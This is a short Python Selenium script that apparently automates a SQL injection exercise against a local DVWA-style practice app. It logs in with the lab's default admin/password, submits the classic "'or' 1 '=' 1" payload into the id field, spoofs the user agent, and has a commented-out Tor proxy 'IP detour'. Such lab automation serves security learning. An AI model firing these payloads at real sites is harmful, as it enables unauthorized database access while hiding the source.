from xml.dom.minidom import Entity
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains

#from selenium.webdriver.support import expected_condition as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait

from selenium.webdriver.chrome.options import Options

from time import sleep

# create a new chrome session
options = Options()
#options.add_argument('--headless')
options.add_argument('--no-sandbox')

# IP detour
# options.add_argument("--proxy-server=socks5://127.0.0.1:9150")
# sleep(3)
options.add_experimental_option("excludeSwitches", ["enable-logging"])
options.add_argument("disable-gpu")
options.add_argument("lang=ko_KR")
options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")

driver = webdriver.Chrome(options=options)
driver.implicitly_wait(0.05)

# Navigate to the application home page

driver.get("http://www.google.com")
driver.implicitly_wait(5)

driver.get("http://127.0.0.1/vulnerabilities/sqli/")
driver.implicitly_wait(5)

login = driver.find_element(by=By.NAME, value="username")
password = driver.find_element(by=By.NAME, value="password")

login.send_keys("admin")
driver.implicitly_wait(5)
password.send_keys("password")
driver.implicitly_wait(5)
password.send_keys(Keys.ENTER)
driver.implicitly_wait(5)

driver.get("http://127.0.0.1/vulnerabilities/sqli/")
driver.implicitly_wait(3)

searchBox = driver.find_element(by=By.NAME, value="id")
driver.implicitly_wait(3)
searchBox.send_keys("\'or\' 1 \'=\' 1")
sleep(5)
searchBox.send_keys(Keys.ENTER)
driver.implicitly_wait(100)

driver.current_url
driver.implicitly_wait(5)

sleep(10)

driver.close()